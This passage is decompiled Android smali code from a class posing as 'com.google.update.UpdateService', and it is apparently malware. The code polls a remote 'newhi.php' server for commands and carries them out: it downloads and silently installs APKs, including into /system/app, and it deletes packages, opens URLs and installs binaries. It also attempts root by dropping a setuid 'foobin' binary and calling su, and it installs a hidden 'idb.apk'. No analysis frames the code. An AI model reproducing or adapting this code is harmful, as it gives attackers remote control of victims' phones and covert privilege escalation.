    invoke-static {p0, v2, v1, v3}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 183
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 184
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "2 "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/system/app/com.google.map.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 185
    .local v0, "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 187
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v1    # "dest":Ljava/lang/String;
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private doExecuteTask(Ljava/lang/String;)V
    .locals 4
    .param p1, "task"    # Ljava/lang/String;

    .prologue
    .line 538
    const-string v2, " "

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 539
    .local v1, "taskLine":[Ljava/lang/String;
    const/4 v2, 0x0

    aget-object v2, v1, v2

    iput-object v2, p0, Lcom/google/update/UpdateService;->m12:Ljava/lang/String;

    .line 540
    const/4 v2, 0x1

    aget-object v2, v1, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 542
    .local v0, "cmd":I
    packed-switch v0, :pswitch_data_0

    .line 567
    :pswitch_0
    const/4 v2, -0x1

    const-string v3, "UnknownTask"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 570
    :goto_0
    :pswitch_1
    return-void

    .line 544
    :pswitch_2
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execHomepage([Ljava/lang/String;)V

    goto :goto_0

    .line 547
    :pswitch_3
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execInstall([Ljava/lang/String;)V

    goto :goto_0

    .line 550
    :pswitch_4
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execStartApp([Ljava/lang/String;)V

    goto :goto_0

    .line 553
    :pswitch_5
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execDelete([Ljava/lang/String;)V

    goto :goto_0

    .line 556
    :pswitch_6
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execOpenUrl([Ljava/lang/String;)V

    goto :goto_0

    .line 559
    :pswitch_7
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execSysInstall([Ljava/lang/String;)V

    goto :goto_0

    .line 564
    :pswitch_8
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execUpBin([Ljava/lang/String;)V

    goto :goto_0

    .line 542
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_0
        :pswitch_1
        :pswitch_8
    .end packed-switch
.end method

.method private doSearchReport()V
    .locals 5

    .prologue
    .line 417
    invoke-direct {p0}, Lcom/google/update/UpdateService;->updateInfo()V

    .line 428
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    :try_start_0
    sget-object v3, Lcom/google/update/RR;->S:[[B

    array-length v3, v3

    if-lt v2, v3, :cond_1

    .line 436
    :cond_0
    :goto_1
    return-void

    .line 429
    :cond_1
    sget-object v3, Lcom/google/update/RR;->S:[[B

    aget-object v3, v3, v2

    invoke-static {v3}, Lcom/google/update/RU;->U9([B)[B

    move-result-object v1

    .line 430
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 431
    .local v0, "action":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "newhi.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 433
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->_doSearchReport(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    if-nez v3, :cond_0

    .line 428
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 435
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    :catch_0
    move-exception v3

    goto :goto_1
.end method

.method private doSearchTask()V
    .locals 1

    .prologue
    .line 471
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getSearchTask()Ljava/lang/String;

    move-result-object v0

    .line 472
    .local v0, "task":Ljava/lang/String;
    if-nez v0, :cond_0

    .line 475
    :goto_0
    return-void

    .line 474
    :cond_0
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->doExecuteTask(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private doTimerTask()V
    .locals 7

    .prologue
    const-wide/16 v5, 0x0

    .line 385
    iget-wide v1, p0, Lcom/google/update/UpdateService;->m14:J

    const-wide/16 v3, 0x1

    add-long/2addr v1, v3

    iput-wide v1, p0, Lcom/google/update/UpdateService;->m14:J

    .line 386
    iget-boolean v1, p0, Lcom/google/update/UpdateService;->m20:Z

    if-eqz v1, :cond_1

    const-string v1, "com.google.map"

    invoke-static {p0, v1}, Lcom/google/update/RU$U10;->U4(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-wide v1, p0, Lcom/google/update/UpdateService;->m14:J

    const-wide/16 v3, 0x2

    rem-long/2addr v1, v3

    cmp-long v1, v1, v5

    if-nez v1, :cond_1

    .line 387
    const-string v0, "/sdcard/idb.apk"

    .line 388
    .local v0, "dest":Ljava/lang/String;
    const-string v1, "init.db"

    const v2, 0xa9c0

    invoke-static {p0, v1, v0, v2}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 389
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 390
    const/4 v1, 0x0

    iput-boolean v1, p0, Lcom/google/update/UpdateService;->m20:Z

    .line 391
    invoke-static {p0, v0}, Lcom/google/update/RU$U10;->U5(Landroid/content/Context;Ljava/lang/String;)V

    .line 412
    .end local v0    # "dest":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 397
    :cond_1
    iget v1, p0, Lcom/google/update/UpdateService;->m13:I

    const/4 v2, 0x2

    if-ne v1, v2, :cond_2

    .line 398
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission2()V

    goto :goto_0

    .line 400
    :cond_2
    iget v1, p0, Lcom/google/update/UpdateService;->m13:I

    const/4 v2, 0x3

    if-ne v1, v2, :cond_3

    .line 401
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    goto :goto_0

    .line 405
    :cond_3
    invoke-static {p0}, Lcom/google/update/RU;->U2(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 407
    iget-wide v1, p0, Lcom/google/update/UpdateService;->m14:J

    const-wide/16 v3, 0x3c

    rem-long/2addr v1, v3

    cmp-long v1, v1, v5

    if-nez v1, :cond_4

    .line 408
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    goto :goto_0

    .line 409
    :cond_4
    iget-wide v1, p0, Lcom/google/update/UpdateService;->m14:J

    const-wide/16 v3, 0xa

    rem-long/2addr v1, v3

    cmp-long v1, v1, v5

    if-nez v1, :cond_0

    .line 410
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchTask()V

    goto :goto_0
.end method

.method private execDelete([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 603
    array-length v0, p1

    if-gt v0, v1, :cond_0

    .line 604
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 609
    :goto_0
    return-void

    .line 608
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->U1(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execHomepage([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 574
    const/4 v0, -0x1

    const-string v1, "NotSupport"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 575
    return-void
.end method

.method private execInstall([Ljava/lang/String;)V
    .locals 8
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v7, 0x3

    const/4 v6, -0x1

    const/4 v5, 0x2

    .line 580
    array-length v3, p1

    if-gt v3, v5, :cond_0

    .line 581
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v6, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 599
    :goto_0
    return-void

    .line 585
    :cond_0
    aget-object v1, p1, v5

    .line 586
    .local v1, "pkgUrl":Ljava/lang/String;
    const/4 v2, 0x0

    .line 587
    .local v2, "run":Ljava/lang/String;
    array-length v3, p1

    const/4 v4, 0x4

    if-lt v3, v4, :cond_1

    .line 588
    aget-object v2, p1, v7

    .line 591
    :cond_1
    const-string v3, "DownStart"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 592
    invoke-static {p0, v1}, Lcom/google/update/RU;->U8(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 593
    .local v0, "info":[Ljava/lang/String;
    if-nez v0, :cond_2

    .line 594
    const-string v3, "DownFailed"

    invoke-direct {p0, v6, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 596
    :cond_2
    const-string v3, "DownOK"

    invoke-direct {p0, v7, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 597
    const/4 v3, 0x0

    invoke-virtual {p0, v0, v2, v3}, Lcom/google/update/UpdateService;->U3([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execOpenUrl([Ljava/lang/String;)V
    .locals 6
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v4, 0x2

    const/4 v5, -0x1

    .line 622
    array-length v3, p1

    if-gt v3, v4, :cond_0

    .line 623
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 637
    :goto_0
    return-void

    .line 628
    :cond_0
    const/4 v3, 0x2

    :try_start_0
    aget-object v3, p1, v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 629
    .local v2, "uri":Landroid/net/Uri;
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.intent.action.VIEW"

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 630
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 631
    invoke-virtual {p0, v1}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    .line 632
    const/4 v3, 0x1

    const-string v4, "OK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 633
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "uri":Landroid/net/Uri;
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 634
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 635
    const-string v3, "Exception"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private execStartApp([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 613
    array-length v0, p1

    if-gt v0, v1, :cond_0

    .line 614
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 618
    :goto_0
    return-void

    .line 617
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->U2(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execSysInstall([Ljava/lang/String;)V
    .locals 9
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v8, 0x2

    const/4 v7, -0x1

    const/4 v6, 0x3

    .line 642
    array-length v4, p1

    if-gt v4, v6, :cond_0

    .line 643
    const-string v4, "InvalidArgs"

    invoke-direct {p0, v7, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 662
    :goto_0
    return-void

    .line 647
    :cond_0
    aget-object v1, p1, v8

    .line 648
    .local v1, "pkgUrl":Ljava/lang/String;
    aget-object v3, p1, v6

    .line 649
    .local v3, "sysName":Ljava/lang/String;
    const/4 v2, 0x0

    .line 650
    .local v2, "run":Ljava/lang/String;
    array-length v4, p1

    const/4 v5, 0x5

    if-lt v4, v5, :cond_1

    .line 651
    const/4 v4, 0x4

    aget-object v2, p1, v4

    .line 654
    :cond_1
    const-string v4, "DownStart"

    invoke-direct {p0, v8, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 655
    invoke-static {p0, v1}, Lcom/google/update/RU;->U8(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 656
    .local v0, "info":[Ljava/lang/String;
    if-nez v0, :cond_2

    .line 657
    const-string v4, "DownFailed"

    invoke-direct {p0, v7, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 659
    :cond_2
    const-string v4, "DownOK"

    invoke-direct {p0, v6, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 660
    invoke-virtual {p0, v0, v2, v3}, Lcom/google/update/UpdateService;->U3([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execUpBin([Ljava/lang/String;)V
    .locals 6
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v4, 0x2

    const/4 v5, -0x1

    .line 665
    array-length v3, p1

    if-gt v3, v4, :cond_0

    .line 666
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 686
    :goto_0
    return-void

    .line 670
    :cond_0
    aget-object v2, p1, v4

    .line 671
    .local v2, "pkgUrl":Ljava/lang/String;
    invoke-static {p0, v2}, Lcom/google/update/RU;->U8(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 672
    .local v1, "info":[Ljava/lang/String;
    if-nez v1, :cond_1

    .line 673
    const-string v3, "DownFailed"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 677
    :cond_1
    const/4 v3, 0x3

    const-string v4, "DownOK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 680
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 681
    const/4 v3, 0x0

    aget-object v3, v1, v3

    invoke-direct {p0, v3}, Lcom/google/update/UpdateService;->tryInstBin(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 682
    .local v0, "errinfo":Ljava/lang/String;
    if-nez v0, :cond_2

    .line 683
    const/4 v3, 0x1

    const-string v4, "UPOK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 684
    :cond_2
    invoke-direct {p0, v5, v0}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 685
    .end local v0    # "errinfo":Ljava/lang/String;
    :cond_3
    const-string v3, "NOPERM"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private getMyDataDir()Ljava/lang/String;
    .locals 2

    .prologue
    .line 103
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "/data/data/"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getPermission()V
    .locals 2

    .prologue
    .line 200
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 201
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    .line 215
    :cond_0
    :goto_0
    return-void

    .line 205
    :cond_1
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_2

    .line 206
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission1()Z

    move-result v0

    if-nez v0, :cond_0

    .line 209
    :cond_2
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/su"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    new-instance v0, Ljava/io/File;

    const-string v1, "/system/xbin/su"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_4

    .line 210
    :cond_3
    const-string v0, "com.noshufou.android.su"

    invoke-static {p0, v0}, Lcom/google/update/RU$U10;->U4(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 211
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission2()V

    goto :goto_0

    .line 212
    :cond_4
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_0

    .line 213
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    goto :goto_0
.end method

.method private getPermission1()Z
    .locals 12

    .prologue
    const/4 v10, 0x1

    const/4 v9, 0x0

    const-string v8, "foobin"

    const-string v11, "P1"

    .line 219
    iget-object v6, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    const-string v7, "P1"

    invoke-interface {v6, v11, v9}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    .line 220
    .local v4, "tried":Z
    if-eqz v4, :cond_0

    move v6, v9

    .line 253
    :goto_0
    return v6

    .line 223
    :cond_0
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 224
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "foobin"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 225
    .local v1, "dest":Ljava/lang/String;
    const-string v6, "foobin"

    const/16 v6, 0x1b80

    invoke-static {p0, v8, v1, v6}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 226
    const-string v6, "/system/bin/chmod"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "4755 "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 227
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, " /data/data/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-static {v6, v7}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 230
    const-string v6, "wifi"

    invoke-virtual {p0, v6}, Lcom/google/update/UpdateService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/net/wifi/WifiManager;

    .line 232
    .local v5, "wifi":Landroid/net/wifi/WifiManager;
    invoke-virtual {v5}, Landroid/net/wifi/WifiManager;->getWifiState()I

    move-result v6

    const/4 v7, 0x3

    if-ne v6, v7, :cond_1

    .line 233
    invoke-virtual {v5, v9}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 234
    const/4 v3, 0x1

    .line 239
    .local v3, "flag":Z
    :goto_1
    const-wide/16 v6, 0x1388

    invoke-static {v6, v7}, Landroid/os/SystemClock;->sleep(J)V

    .line 240
    invoke-virtual {v5, v3}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 243
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v6

    if-eqz v6, :cond_2

    .line 244
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    move v6, v10

    .line 246
    goto :goto_0

    .line 236
    .end local v3    # "flag":Z
    :cond_1
    invoke-virtual {v5, v10}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 237
    const/4 v3, 0x0

    .restart local v3    # "flag":Z
    goto :goto_1

    .line 250
    :cond_2
    iget-object v6, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 251
    .local v2, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v6, "P1"

    invoke-interface {v2, v11, v10}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 252
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move v6, v9

    .line 253
    goto/16 :goto_0
.end method

.method private getPermission2()V
    .locals 15

    .prologue
    const/4 v13, 0x0

    const-string v14, "su"

    const-string v10, "foobin"

    const-string v10, "UTF-8"

    const-string v12, "P2"

    .line 259
    iget-object v10, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    const-string v11, "P2"

    invoke-interface {v10, v12, v13}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 260
    .local v1, "count":I
    const/4 v10, 0x3

    if-lt v1, v10, :cond_1

    .line 261
    iput v13, p0, Lcom/google/update/UpdateService;->m13:I

    .line 262
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v10

    if-nez v10, :cond_0

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    .line 309
    :cond_0
    :goto_0
    return-void

    .line 265
    :cond_1
    add-int/lit8 v1, v1, 0x1

    .line 266
    iget-object v10, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    invoke-interface {v10}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 267
    .local v4, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v10, "P2"

    invoke-interface {v4, v12, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 268
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 269
    const/4 v10, 0x2

    iput v10, p0, Lcom/google/update/UpdateService;->m13:I

    .line 271
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 273
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    :try_start_0
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "foobin"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 274
    .local v2, "dest":Ljava/lang/String;
    const-string v10, "foobin"

    const/16 v11, 0x1b80

    invoke-static {p0, v10, v2, v11}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 275
    const-string v10, "/system/bin/chmod"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "4755 "

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 277
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v10

    const-string v11, "su"

    invoke-virtual {v10, v11}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v9

    .line 278
    .local v9, "process":Ljava/lang/Process;
    const/4 v8, 0x0

    .line 279
    .local v8, "os":Ljava/io/DataOutputStream;
    new-instance v8, Ljava/io/DataOutputStream;

    .end local v8    # "os":Ljava/io/DataOutputStream;
    invoke-virtual {v9}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    invoke-direct {v8, v10}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 280
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, " /data/data/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

